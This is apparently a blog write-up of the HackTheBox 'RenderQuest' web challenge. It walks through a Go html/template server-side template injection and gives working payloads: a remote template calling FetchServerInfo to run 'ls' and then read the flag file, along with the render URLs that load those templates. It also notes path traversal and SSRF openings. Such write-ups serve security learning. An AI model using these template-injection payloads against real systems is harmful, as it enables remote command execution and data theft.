---
description: ""
draft: false
tags:
  - hackthebox
enableToc: true
unlisted: false
title: RenderQuest Challenge
date: 2024-03-31
---
An [[rating:: easy]], [[challenge_category:: web]] challenge. 

## Initial Observations
### Technology
- Go programming language.
- Go's `"html/template"` engine.
### Misc
- The flag resides at the docker containers root.
- The flag file's name gets obfuscated to `flag<random>.txt` where `<random>` is 10 hexadecimal characters (a-f and 0-9). This is done each time the docker container starts, as it is part of the `entrypoint.sh` file. So this should throw an error when the container starts the second time, since `flag.txt` doesnt't exist anymore.
- The `entrypoint.sh` file has a `#!/bin/ash` shebang (Almquist shell), probably not relevant, but I am so used to `bash`that this caught my eye.
- The webapp runs as `root` user.

>[!info] The Challenge
>The challenge description already outlines what to do: "You've found a website that lets you input remote templates for rendering. Your task is to exploit this system's vulnerabilities to access and retrieve a hidden flag."

## Deep Dive
So let's have a look at the application. This is my first time looking at Go code in depth, but thankfully everything is in one handy file. Since we already know this challenge is about templating, let's start there_

### The `getTpl` function
- Takes two query parameters: `page` and `use_remote`. 
- Checks for the presence of a `user_ip` Cookie, if not present, deduces it from the `http.Request` object.
- Gets Location Info by requesting: `https://freeipapi.com/api/json/" + clientIP` where `clientIP` can bet set via the `user_ip` cookie (SSRF poetential!)
- Gets other data using the `FetchServerInfo` function which can execute arbitrary commands. However, I do not see obvious ways to set such a command (Spoiler: turns out there is a way).
- It then either fetches a remote template file, if `use_remote == "true"` or loads a file using `readFile(TEMPLATE_DIR+"/"+page, "./")` where we can set `page`.  Browsing to `/render?use_remote=false&page=../main.go`  shows that the code is indeed vulnerable to path traversal, however, the obfuscation of the flag filename prevents us from simply loading it using path traversal.

### The `FetchServerInfo` method
This function actually has a misleading name and should be called `ExecuteArbitraryCommands` since this is what it is doing. Such a methods as part of a HTB challenge makes me really suspicious.

>[!summary] My thoughts
>At this point I assume that we need a two step attack. First, let the server fetch a malicious template file from us that figures out the obfuscated flag filename. Then simply use path traversal to get the flag.

### Go's `html/template` Engine

Key to this is how Go handles templates. From the imports in `main.go` we can see that the app uses the `html/template` engine. We can find the [docs here](https://pkg.go.dev/html/template). Some research on [hacktricks.xyz](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#ssti-in-go) reveals that we might be able to get remote code execution: 
>"For example, if the provided object has a `System` method executing commands, it can be exploited like `{{ .System "ls" }}`. Accessing the source code is usually necessary to exploit this, as in the given example:"

I am not exactly sure at this point what the `object` is, but the `FetchServerInfo` method already made me suspicious, so I am just hoping that the `object` is the `reqData`

## Exploit Attempt 1

**Create a template file that contains:**
```
{{ .FetchServerInfo "ls .." }}
```

**Host it using python:**
1. Find out your VPN tunnel ip address with: 
		`ip address | grep tun0 | grep inet | cut -d " " -f6`
2. Run a simple web server, for example with python3:
		`python3 -m http.server`

>[!warning] OpenVPN problems
>The above approach should work, however I ran into problems where the target machine couldn't connect to my pwn machine through the openvpn connection. So I ended up hosting the malicious template publicly instead.

**Call the `/render` endpoint with the corresponding query parameters**
or simply surf to `http://<target_ip>/render?use_remote=true&page=https%3A%2F%2Fraw.githubusercontent.com%2Fkon-foo%2Fmisc%2Fmain%2Ftemplate.tpl` 
Et voilá: We get a list of the file in the root dir, including the obfuscated flag! At a second glance at the source code, I realized that this `err = tmpl.Execute(w, reqData)` is probably why this works. The `reqData` is passed to the `template` and the `FetchServerInfo` is defined on the `RequestData` type!

Now on to the second part:

**Get the flag**
by using path traversal. Just browse to `http://<target_ip>/render?use_remote=true&page=../../flag<obfuscation>.txt` Aaaand `Internal Server Error` :/ Back to the source code: I realized that I haven't even checked the implementation of `readFile` and after I was able to access a file outside of the template dir I was convinced I could open any file.
My brain was about to look for solutions how to circumvent this check, but luckily something clicked before getting into that wormhole: I already have remote code execution as root... What the heck am I doing here. Don't over-complicate things!

## Exploit Attempt 2
So let's adapt our malicious template to `cat` the first file in the parent directory that starts with `flag`:
```template
{{ .FetchServerInfo "cut -d' ' -f1 ../../flag*" }}
```
Because of my OpenVPN connection issues, I hosted this [file on Github](https://github.com/kon-foo/misc/blob/main/template2.tpl) as well. Browse to `http://<target_ip>/render?use_remote=true&page=https://raw.githubusercontent.com/kon-foo/misc/main/template2.tpl` and there you have it: The glorious, beautiful flag.

## What I have learned
- This was my first time really looking at Go code, so there is that. Two take aways from that:
	- Go uses its own template engine!
	- In Go you can define methods on types, like `func (p RequestData) FetchServerInfo(...) {...}`
- Obfuscation is not Security, but it makes for an interesting challenge:)
- Do make things more complicated than they are! Especially if you already have root code execution, don't look further.





